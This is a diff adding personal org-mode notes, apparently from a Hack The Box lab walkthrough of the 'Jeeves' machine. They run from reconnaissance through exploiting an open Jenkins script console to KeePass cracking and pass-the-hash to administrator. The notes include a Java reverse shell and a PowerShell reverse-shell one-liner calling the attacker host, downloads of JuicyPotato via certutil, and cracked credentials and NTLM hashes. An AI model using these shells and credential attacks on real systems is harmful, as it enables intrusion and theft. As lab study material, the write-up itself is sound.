@@ -1,0 +1,709 @@
+* nmap scan
+  #+begin_src bat
+  $ sudo nmap -A 10.10.10.63
+
+Nmap scan report for localhost (10.10.10.63)
+Host is up (0.063s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ask Jeeves
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 13h56m17s, deviation: 0s, median: 13h56m17s
+| smb2-time: 
+|   date: 2025-10-16T12:45:54
+|_  start_date: 2025-10-16T12:43:01
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+  #+end_src
+  so there's an http server running; let's take a look at the application
+* http
+  unsurprisingly, it's jeeves (as the =http-title= from the nmap scan shows: =Ask Jeeves=)
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-10-16_10-22.png @ 2025-10-16 10:23:14
+[[file:http/2025-10-16_10-23-14_2025-10-16_10-22.png]]
+* gobuster
+  let's enumerate application pages
+  #+begin_src bat
+  $ gobuster dir -u http://10.10.10.63/  -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.63/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 503]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+  #+end_src
+  only finds =index.html=
+* interact with the application
+  the application errors out when you enter a search term; the following is returned upon
+  entering the string =test=
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-10-16_11-09.png @ 2025-10-16 11:10:45
+  [[file:interact_with_the_application/2025-10-16_11-10-45_2025-10-16_11-09.png]]
+  +looks liks thie might be vulnerable to sql injection?+; ok probably not, this is just a static
+  error page that's returned when you click the =Search= button. the content of the error page
+  is just the above image
+* IIS Tilde Enumeration
+  grepping for =gobuster= brought up [[file:d:/code/htb/academy/modules/attacking-common-applications/IIS-Tilde-enumeration.org::*overview][this]] link; let's do tilde enumeration
+  however, instead of =iis_shortname_scanner=, I decided to try the bitquark go application
+  install with:
+  #+begin_src bat
+  go install github.com/bitquark/shortscan/cmd/shortscan@latest
+  #+end_src
+  this installs the app to the =~/go/bin= directory which has been added to the path;
+  use like:
+  #+begin_src bat
+  $ shortscan 10.10.10.63
+
+================================================================================
+URL: http://10.10.10.63/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+================================================================================
+INDEX~1.HTM          INDEX.HTM?          INDEX.HTML
+ASK-JE~1.JPG         ASK-JE?.JPG? 
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+================================================================================
+  #+end_src
+  the image is
+  #+begin_src 
+  http://10.10.10.63/Ask-Jeeves-whatever-happened-to-32225327-270-301.jpg
+  #+end_src
+  this image is embedded into the html page via this css:
+   #+begin_src css
+   body {
+        background: #fff url(Ask-Jeeves-whatever-happened-to-32225327-270-301.jpg) no-repeat calc(50% - 240px);
+        font: 13px 'Lucida sans', Arial, Helvetica;
+        color: #eee;
+        text-align: center;
+    }
+   #+end_src
+* guided mode
+** What's the relative path on the webserver on port 50000 to an open source automation server
+   i suppose we should be running gobuster or ffuf
+** ffuf
+  #+begin_src 
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ
+
+askjeeves
+  #+end_src
+  ok, so this reveals the real askjeeves application -- however, upon visiting the url, it
+  turns out it's not askjeeves at all!
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-10-17_09-15.png @ 2025-10-17 09:16:16
+  [[file:guided_mode/2025-10-17_09-16-16_2025-10-17_09-15.png]]
+  NOTE: looking back at the nmap scan output, maybe i should have paid more attention:
+  #+begin_src 
+  50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+
+<SNIP>
+
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+  #+end_src
+** password bruteforce
+   let's try and crack the creds for the jenkins server
+   #+begin_src 
+   $ hydra http://10.10.10.63:50000/askjeeves/login -l admin -p /usr/share/wordlists/rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid login information"
+   #+end_src
+   this wasn't returning anything, so consulted the [[file:d:/code/htb/academy/modules/attacking-common-applications/attacking-jenkins.org::*Script Console][attacking-jenkins]] module. we do have
+   access to the scripting console even without logging in.
+* scripting console
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-10-17_14-35.png @ 2025-10-17 14:36:06
+   [[file:guided_mode/2025-10-17_14-36-06_2025-10-17_14-35.png]]
+   let's try and obtain a reverse shell; let's use the msfconsole version
+* msfconsole
+   #+begin_src bat
+   msf6 exploit(multi/http/jenkins_script_console) > set lhost tun0
+
+   msf6 exploit(multi/http/jenkins_script_console) > set srvhost tun0
+   
+   msf6 exploit(multi/http/jenkins_script_console) > set RPORT 50000
+  
+   msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 10.10.10.63
+ 
+   msf6 exploit(multi/http/jenkins_script_console) > set TARGETURI /askjeeves/script
+
+   msf6 exploit(multi/http/jenkins_script_console) > run
+
+[*] Started reverse TCP handler on 10.10.16.9:4444 
+[*] Checking access to the script console
+[*] No authentication required, skipping login...
+[*] Using CSRF token: '5f17ed1812dcd7df600beac6b363406f' (Jenkins-Crumb style v1)
+[*] 10.10.10.63:50000 - Sending command stager...
+[*] Authentication required for Jenkins-CI Groovy script console - Logging in...
+[-] Exploit aborted due to failure: unexpected-reply: Failed to identify the login resource.
+[*] Exploit completed, but no session was created.
+
+   msf6 exploit(multi/http/jenkins_script_console) > set TARGETURI /askjeeves
+
+   msf6 exploit(multi/http/jenkins_script_console) > run
+
+[*] Started reverse TCP handler on 10.10.16.9:4444 
+[*] Checking access to the script console
+[*] No authentication required, skipping login...
+[*] Using CSRF token: '5f17ed1812dcd7df600beac6b363406f' (Jenkins-Crumb style v1)
+[*] 10.10.10.63:50000 - Sending command stager...
+[*] Authentication required for Jenkins-CI Groovy script console - Logging in...
+[-] Exploit aborted due to failure: no-access: Incorrect credentials - :
+[*] Exploit completed, but no session was created.
+   #+end_src
+   ok, this doesn't work; so let's do it manually
+* java reverse shell
+  #+begin_src 
+  String host="10.10.16.9";
+  int port=8443;
+  String cmd="cmd.exe";
+  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+  #+end_src
+  on the netcat listener we get
+  #+begin_src bat
+  $ nc -lvnp 8443
+
+  listening on [any] 8443 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.63] 49676
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\.jenkins>whoami
+whoami
+jeeves\kohsuke
+  #+end_src
+  we can read the =user.txt= on the the kohsuke user's desktop
+  #+begin_src bat
+  C:\Users\Administrator\.jenkins>type C:\Users\kohsuke\Desktop\user.txt
+
+e3232272596fb47950d59c4cf1e7066a 
+  #+end_src
+* privilege escalation
+  let's check the user's privileges
+  #+begin_src bat
+  C:\Users\Administrator\.jenkins>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+  #+end_src
+* juicypotato
+  let's transfer juicypotato after downloading it
+  #+begin_src 
+  $ certutil -urlcache -split -f "http://10.10.16.9:8123/JuicyPotato.exe" C:\Windows\Temp\juicypotato.exe
+  #+end_src
+  this runs into unrecognized command error, so let's try something else
+  #+begin_src 
+  (New-Object Net.WebClient).DownloadFile('http://10.10.16.9:8123/JuicyPotato.exe','C:\Windows\Temp\juicypotato.exe')
+  #+end_src
+  this doens't work either - the shell is cmd and not powershell and upgrading it to
+  powershell is also not going well.
+* back to msfconsole
+  decided to spend more time trying to get the metasploit module to work but wasn't really
+  successful. however, a glance at the guided mode suggested I might find some =keypass db=, so
+  I decided to try traditional credential hunting
+* credential hunting
+  #+begin_src bat
+  C:\Users\Administrator\.jenkins>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+
+ users\admin\config.xml  
+  #+end_src
+  we had actually seen this file previously, however, after a closer look, it contains the
+  jenkins API token for the admin user
+  #+begin_src 
+  C:\Users\Administrator\.jenkins>type users\admin\config.xml
+  #+end_src
+  #+begin_src xml
+<?xml version='1.0' encoding='UTF-8'?>
+<user>
+  <fullName>admin</fullName>
+  <properties>
+    <jenkins.security.ApiTokenProperty>
+      <apiToken>{AQAAABAAAAAwID3cR3pyZaEkaDPU25Z0S+nrU8+gDgB0JEWORJ5L1P2T+zXc/tSs2IVn1ugWLaui54D6yYki4vhXQtGhqUSeFw==}</apiToken>
+    </jenkins.security.ApiTokenProperty>
+    <hudson.model.MyViewsProperty>
+      <views>
+        <hudson.model.AllView>
+          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
+          <name>all</name>
+          <filterExecutors>false</filterExecutors>
+          <filterQueue>false</filterQueue>
+          <properties class="hudson.model.View$PropertyList"/>
+        </hudson.model.AllView>
+      </views>
+    </hudson.model.MyViewsProperty>
+    <hudson.model.PaneStatusProperties>
+      <collapsed/>
+    </hudson.model.PaneStatusProperties>
+    <hudson.search.UserSearchProperty>
+      <insensitiveSearch>true</insensitiveSearch>
+    </hudson.search.UserSearchProperty>
+    <hudson.security.HudsonPrivateSecurityRealm_-Details>
+      <passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
+    </hudson.security.HudsonPrivateSecurityRealm_-Details>
+    <jenkins.security.LastGrantedAuthoritiesProperty>
+      <roles>
+        <string>authenticated</string>
+      </roles>
+      <timestamp>1509762882255</timestamp>
+    </jenkins.security.LastGrantedAuthoritiesProperty>
+  </properties>
+</user>
+  #+end_src
+  however, the module still seems to fail
+  #+begin_src bat
+  msf6 exploit(multi/http/jenkins_script_console) > run
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Checking access to the script console
+[*] No authentication required, skipping login...
+[*] Using CSRF token: '5f17ed1812dcd7df600beac6b363406f' (Jenkins-Crumb style v1)
+[*] 10.10.10.63:50000 - Sending command stager...
+[*] Authentication required for Jenkins-CI Groovy script console - Logging in...
+[-] Exploit aborted due to failure: no-access: Incorrect credentials - admin:
+[*] Exploit completed, but no session was created.
+  #+end_src
+  NOTE: the =API_TOKEN= parameter was set both with and without the braces and still failed
+* back to credential hunting
+  ok, let's search for =keepass= files; however, it turns out we can't go back up a directory:
+  #+begin_src bat
+  C:\Users\Administrator\.jenkins>dir /b /s *.kdbx
+
+File Not Found
+
+  C:\Users\Administrator\.jenkins>cd ..
+
+Access is denied.
+  #+end_src
+** filter by multiple extensions
+   NOTE: just fyi
+   #+begin_src bat
+   dir /b /s | findstr /i "\.jpg \.png"
+   #+end_src
+* kdbx file
+  ok, just looking around the =kohsuke= user's directory, the kdbx file was found in the
+  Documents folder.
+  #+begin_src 
+C:\Users\kohsuke>dir
+
+ Volume in drive C has no label
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\kohsuke\Documents
+
+11/03/2017  10:18 PM    <DIR>
+11/03/2017  10:18 PM    <DIR>
+09/18/2017  12:43 PM             2,846 CEH.kdbx
+	       1 File(s)          2,846 bytes
+	       2 Dir(s)   2,652,221,440 bytes free
+  #+end_src
+  ok, how do we tranfser this to kali?
+** smbserver
+   on kali
+   #+begin_src 
+   sudo impacket-smbserver share ./ -smb2support
+   #+end_src
+   on windows:
+   #+begin_src bat
+   copy .\CEH.kdbx \\10.10.16.33\share\
+   #+end_src
+   fails with /cannot find the file specified/, so let's use the full path
+   #+begin_src 
+   C:\Users\kohsuke>copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.16.33\share\
+
+        1 file(s) copied.
+   #+end_src
+   works
+* run jacktheripper against the kdbx file
+  #+begin_src bat
+  keepass2john CEH.kdbx > keypass.hash
+  #+end_src
+  however, hashcat fails to identify this as a valid keypass hash. here are the contents of
+  the hash file
+  #+begin_src 
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c564
+  #+end_src
+  hashcat:
+  #+begin_src bat
+  $ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
+
+Hash 'keepass.hash': Salt-length exception
+No hashes loaded.
+  #+end_src
+  ok chatgpt recognized that the issue is that the hash begins with =CEH= whereas it should
+  begin with =$keepass$=; so let's remove it and try again.
+  however, this wasn't enough. the problem was also with the line-endings.
+  #+begin_src bat
+    sed 's/^.*\$keepass\$/$keepass$/' keepass_raw.txt | dos2unix | sed 's/[[:space:]]\+$//' > keepass_clean.hash
+  #+end_src
+  so, something like this needed to be done. and now hashcat worked:
+  #+begin_src 
+  $ hashcat -m 13400 keepass_clean.hash /usr/share/wordlists/rockyou.txt
+
+$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
+  #+end_src
+* keepass
+  after loading the database up in the keepassxc application, we are able to read the DC admin
+  creds: =S1TjAtJHKsugh9oC4VZl=
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-03_16-14.png @ 2025-11-03 16:15:15
+  [[file:keepass/2025-11-03_16-15-15_2025-11-03_16-14.png]]
+  try and run stuff as the admin user
+  #+begin_src bat
+    runas /user:.\administrator "cmd.exe"
+    runas /user:.\administrator "cmd /C \"dir C:\Users\Administrator\Desktop\""
+    schtasks /create /sc once /tn TempTask /tr "cmd /c type C:\Users\Administrator\Desktop\root.txt" /st 23:59 /ru .\Administrator /rp 'S1TjAtJHKsugh9oC4VZl'
+    ## errors out with ERROR: No mapping between account names and security IDs was done.
+    ## the below line is what needed to be run to execute the task immediately
+    schtasks /run /tn TempTask
+  #+end_src
+  chatgpt then suggested upgrading the shell since powershell was confirmed to be present:
+  #+begin_src bat
+  C:\Users\kohsuke>where powershell 2>nul || echo no-powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+  C:\Users\kohsuke>where python 2>nul || echo no-python
+no-python
+
+  C:\Users\kohsuke>where certutil 2>nul || echo no-certutil
+no-certutil
+
+  C:\Users\kohsuke>ver
+Microsoft Windows [Version 10.0.10586]
+  #+end_src
+  setup an nc listener on 4444 and then run:
+  #+begin_src bat
+  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.10.16.33',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1 | Out-String;$r2=$r + 'PS ' + (pwd).Path + '> ';$bt=([text.encoding]::ASCII).GetBytes($r2);$s.Write($bt,0,$bt.Length);$s.Flush()};$c.Close()"
+  #+end_src
+** schtasks
+  #+begin_src bat
+  schtasks /create /sc once /tn TempTask /tr "cmd /c dir C:\Users\Administrator\Desktop\ > C:\Windows\Temp\out.txt 2>&1" /ru .\Administrator /rp "S1TjAtJHKsugh9oC4VZl" && schtasks /run /tn TempTask && timeout /t 2 >nul & type C:\Windows\Temp\out.txt & schtasks /delete /tn TempTask /f
+  #+end_src
+  this doesn't work -- nothing happens
+* microsoft-ds
+  ok, looking back at the nmap ouput, turns out microsoft-ds is the smb service; let's try
+  to connect with the admin creds.
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u administrator -p S1TjAtJHKsugh9oC4VZl --loggedon-users
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
+
+  $ netexec smb 10.10.10.63 -u Administrator -p S1TjAtJHKsugh9oC4VZl --loggedon-users
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
+  #+end_src
+  fails for both =administrator= and =Administrator=; so maybe this is not the right account to
+  target? let's try one of the other creds
+** try bob's creds
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-04_08-16.png @ 2025-11-04 08:17:17
+   [[file:microsoft-ds/2025-11-04_08-17-17_2025-11-04_08-16.png]]
+   however, this doesn't work either
+   #+begin_src bat
+   $ netexec smb 10.10.10.63 -u bob -p lCEUnYPjNfIuPZSzOySA --loggedon-users                 
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
+   #+end_src
+** localhost 8180 from the keepass creds list list
+   trying the endpoint http://localhost:8180/secret.jsp; however, it fails to load.
+   sudo nmap -p- -sV -sC -Pn 10.10.10.63
+* full nmap scan
+  did a scan for all ports just in case; but revealed no extra services
+  #+begin_src bat
+  $ sudo nmap -p- -sV -sC -Pn 10.10.10.63 -T4
+
+Nmap scan report for localhost (10.10.10.63)
+Host is up (0.055s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Ask Jeeves
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 3d13h24m03s, deviation: 0s, median: 3d13h24m02s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-11-04T15:46:38
+|_  start_date: 2025-11-03T11:40:25
+  #+end_src
+* guided mode - which accoun't NTLM hash is saved in the keepass db
+  fucking hell. i never looked at the password corresponding to the =Backup stff= title
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-04_12-54.png @ 2025-11-04 12:55:29
+  [[file:guided_mode_-_which_accoun't_NTLM_hash_is_saved_in_the_keepass_db/2025-11-04_12-55-29_2025-11-04_12-54.png]]
+  turns out that's the admin account's hash:
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
+
+SMB 10.10.10.63     445    JEEVES   [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB 10.10.10.63     445    JEEVES   [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+  #+end_src
+  let's look for the flag:
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'type C:\Users\Administrator\Desktop\root.txt'
+
+SMB 10.10.10.63     445    JEEVES  [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB 10.10.10.63     445    JEEVES  [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+SMB 10.10.10.63     445    JEEVES  [-] WMIEXEC: Dcom initialization failed on connection with stringbinding: "ncacn_ip_tcp:10.10.10.63[49666]", please increase the timeout with the option "--dcom-timeout". If it's still failing maybe something is blocking the RPC connection, try another exec method
+SMB 10.10.10.63     445    JEEVES  [-] Execute command failed with wmiexec
+  #+end_src
+  same result for
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'dir C:\Users\Administrator\Desktop'
+  #+end_src
+** use crackmapexec
+  #+begin_src bat
+  $ crackmapexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'dir C:\Users\Administrator\Desktop'
+
+SMB 10.10.10.63     445    JEEVES [+] Executed command 
+SMB 10.10.10.63     445    JEEVES Volume in drive C has no label.
+SMB 10.10.10.63     445    JEEVES Volume Serial Number is 71A1-6FA1
+SMB 10.10.10.63     445    JEEVES 
+SMB 10.10.10.63     445    JEEVES Directory of C:\Users\Administrator\Desktop
+SMB 10.10.10.63     445    JEEVES 
+SMB 10.10.10.63     445    JEEVES  .
+SMB 10.10.10.63     445    JEEVES  ..
+SMB 10.10.10.63     445    JEEVES  hm.txt
+SMB 10.10.10.63     445    JEEVES  Windows 10 Update Assistant.lnk
+SMB 10.10.10.63     445    JEEVES 2 File(s)            833 bytes
+SMB 10.10.10.63     445    JEEVES 2 Dir(s)   2,639,548,416 bytes free
+  #+end_src
+  ok let's read =hm.txt=
+   #+begin_src bat
+   $ crackmapexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'type C:\Users\Administrator\Desktop\hm.txt'
+
+SMB 10.10.10.63     445    JEEVES [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB 10.10.10.63     445    JEEVES [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+SMB 10.10.10.63     445    JEEVES [+] Executed command 
+SMB 10.10.10.63     445    JEEVES The flag is elsewhere.  Look deeper.
+   #+end_src
+   ok, so much for that; we might need to look at the =lnk= file
+   #+begin_src 
+   $ crackmapexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'type C:\Users\Administrator\Desktop\Windows 10 Update Assistant.lnk'
+   #+end_src
+* back to nxc
+  after updating and using a different =exec-method=, we get results
+  #+begin_src 
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'type C:\Users\Administrator\Desktop\hm.txt' --dcom-timeout 6000 --exec-method smbexec
+
+[*] Initializing SMB protocol database
+SMB 10.10.10.63     445    JEEVES [*] Windows 10 Build 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) 
+SMB 10.10.10.63     445    JEEVES [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+SMB 10.10.10.63     445    JEEVES [+] Executed command via smbexec
+SMB 10.10.10.63     445    JEEVES The flag is elsewhere.  Look deeper.
+  #+end_src
+  IMPORTANT: faced an issue trying to view the contents of the desktop directory when issuing:
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'dir C:\Users\Administrator\Desktop\' --dcom-timeout 6000 --exec-method smbexec
+
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Build 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) 
+SMB         10.10.10.63     445    JEEVES           [-] Error checking if user is admin on 10.10.10.63: The NETBIOS connection with the remote host timed out.
+SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 
+  #+end_src
+  however, the issue here is the =\= at the end of the directory name; removing that solves it:
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'dir C:\Users\Administrator\Desktop' --dcom-timeout 6000 --exec-method smbexec       
+
+SMB 10.10.10.63     445    JEEVES [*] Windows 10 Build 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) 
+SMB 10.10.10.63     445    JEEVES [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+SMB 10.10.10.63     445    JEEVES [+] Executed command via smbexec
+SMB 10.10.10.63     445    JEEVES  Volume in drive C has no label.
+SMB 10.10.10.63     445    JEEVES  Volume Serial Number is 71A1-6FA1
+SMB 10.10.10.63     445    JEEVES  Directory of C:\Users\Administrator\Desktop
+SMB 10.10.10.63     445    JEEVES  <DIR>  .
+SMB 10.10.10.63     445    JEEVES  <DIR>  ..
+SMB 10.10.10.63     445    JEEVES         36 hm.txt
+SMB 10.10.10.63     445    JEEVES         797 Windows 10 Update Assistant.lnk
+SMB 10.10.10.63     445    JEEVES 2 File(s)            833 bytes
+SMB 10.10.10.63     445    JEEVES 2 Dir(s)   2,673,790,976 bytes free
+  #+end_src
+  ok, let's check the =lnk= file:
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x 'type "C:\Users\Administrator\Desktop\Windows 10 Update Assistant.lnk"' --dcom-timeout 6000 --exec-method smbexec 
+  #+end_src
+  however, the output is not clean since it's a binary file.
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-04_13-38.png @ 2025-11-04 13:38:24
+  [[file:back_to_nxc/2025-11-04_13-38-24_2025-11-04_13-38.png]]
+  asked chatgpt for a way to use netexec to resolve the link:
+  #+begin_src bat
+  $ netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 --exec-method smbexec -x "powershell -NoProfile -NonInteractive -Command \"\$s = (New-Object -ComObject WScript.Shell).CreateShortcut('C:\Users\Administrator\Desktop\Windows 10 Update Assistant.lnk'); Write-Output 'Target: ' + \$s.TargetPath; Write-Output 'Args: ' + \$s.Arguments; Write-Output 'WorkDir: ' + \$s.WorkingDirectory\"" 
+
+SMB 10.10.10.63     445    JEEVES           [+] Executed command via smbexec
+SMB 10.10.10.63     445    JEEVES           Target:
+SMB 10.10.10.63     445    JEEVES           +
+SMB 10.10.10.63     445    JEEVES           C:\Windows10Upgrade\Windows10UpgraderApp.exe
+SMB 10.10.10.63     445    JEEVES           Args:
+SMB 10.10.10.63     445    JEEVES           +
+SMB 10.10.10.63     445    JEEVES           /ClientID "Win10Upgrade:VNL:Th2Eos:{}"
+SMB 10.10.10.63     445    JEEVES           WorkDir:
+SMB 10.10.10.63     445    JEEVES           +
+  #+end_src
+* try and download the file to our attack host
+  #+begin_src 
+  impacket-smbclient -hashes :e0fb1fb85756c24235ff238cbe81fe00 .\\Administrator@10.10.10.63 C$ -c "get 'Windows10Upgrade\\Windows10UpgraderApp.exe' /tmp/Windows10UpgraderApp.exe"
+
